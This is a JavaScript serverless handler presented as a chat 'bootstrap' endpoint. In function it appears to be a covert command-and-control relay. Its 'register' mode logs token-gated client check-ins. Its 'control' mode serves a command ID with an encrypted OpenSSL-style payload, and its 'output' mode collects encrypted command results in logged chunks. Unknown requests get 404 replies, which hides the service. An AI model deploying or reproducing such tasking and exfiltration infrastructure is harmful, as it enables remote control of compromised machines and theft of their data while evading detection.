import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '36';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+goAkdy8PgyEl3yzaX/h1Rk9D4k7HBdBA/d2YHNP8AdJkxvG8BWzBq77DYN0McXfvGXVHjYGHNlwfgoNxRPiiAeijcGcEMJv3V3i+cZczRau+DTbSG8bjnNjcVrYjBIaeB4JRVYZwg9qaXgzmzmiV9a5WLYxlhK2AVbllg4e1z3F38SZUs2pMkSJ2sUzJ2tj9AuCLwLv4+3cgIMeZiNAlyxLn35TJ3HIrPVmAEqnB5N1hSx/O7MFiBKjdixmWLeosLDYwjJ7+qtptnfkxUwTc/PsSBX5eu86osEh4LKtcgiEFKZP+3X+fpGubAaXaEpUYobGI+i6Y4/JLWVxO8BD5zbPmEKXglxwcwWNU3JnHv+AUzGHxKXvXPKRjZWCYv4vjgOmzWGSkBJHxvfWA/HBlbmGCZN5hbGDoeVXzVjx/HVpH4vu9WczHaLbge3S+QZk7BcKcrwnPaEpQC9JTAa8VkH8GP+AOgM9+tOJIIuoDfZYHgg4crzNIPFlNKKB+yhHlHDAt5GyiFp9EEInFjPK5VdaxqhrFuQlI9CAqVUr2LVyBAmz+tJHTsnfAeYX1jFIHbIzvuVsEyBY4RAiDDEhVULvmqtfneS5YGEYmoSUpoLcNuKo8jY1cZZjJG+W7oP6p4qFsLJIWpouXu2/SrFhDNsQPNzTb+I/maTWkmjtugTSkDAuc7dYrfcvlk2IIudjcEkH7I+zUymKntQ5OWJ0dmbvPIBVeOJ+KvBZNEEzHZBSn8WCxYLvbcMI6YCGOMh6oxCGHzAtoV5yoALWSWOqcxsOJI5GBOArGbYKJrjYOw6jUocM1U/4KVlHzA37mp57sh+3dWiPCHhsXNhqJc1vVt6Mtx3rv6ikbXoOPu9Tf1seJwYy8U9nI6KywvIgcWQXsLhM1vF0VoGTalUWudTo0WEzcjcKaVePs8bYAxB8xGfLiH2T3iqPKyr4DzUYPUjfIeYKhe6heFpGc0a8m9NfB/vF1g3D2d7TdkCsjCKJiE73tHBfKYDkUhIkBKDF8rnOl2ApHdKuTxZEDxhxpYPVGZuamSAybUOjRqSz2qd1Mz9T5HRj5K+3UPLvYTIXA/pFY1dThsJXZoClpdlaZFwzRrfwgCK/yW0jM4O/BcBWzuHuBEgCnHvcZuVbvvND3xNxePcijGwaJIF6Pwi4mSaIbwZN8Llp/2YzGYUcHRmkNP8kTa2ESzRWfqw55eOtA3lCVK+B7WO/PXpMJvnhjGRYhMXg7jVLtgTB7iFpRc8BdSOoKpwQLT+Hgi09P7H1+fK4KRrrfmKLCGrLDL1SOnECR4L3FiDGH8HO4DyBdnKsqb/HSitPsD8fJZmjkqcz3uJ+v0gV9MDHi/rSsaOdjxjvuDnIoZTsrJvi3A4K2D7aljsSXleYoMmRbtDweWZqz3UCtqPgyNwM7Kb4ZW8hpfk9wZXwcVpdroZVBHkFN7EcgFw4m1KkF+FPxWYnPgWDY0luKyc8YQyo3DHjVwcVcBJMZ3mNPViPAIa/A7loCSoOFKMw8KoDM4Z7Hjt4I+ijgxzcGRBEeziJXL96yfZJPiz/s2+6D/ggLrm3EKuRsWiOMDmHAyHtePXm0frmxP1FSKDlsdloAiHCuxRS/pFVcaeLwU72MYzILZzg=="';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
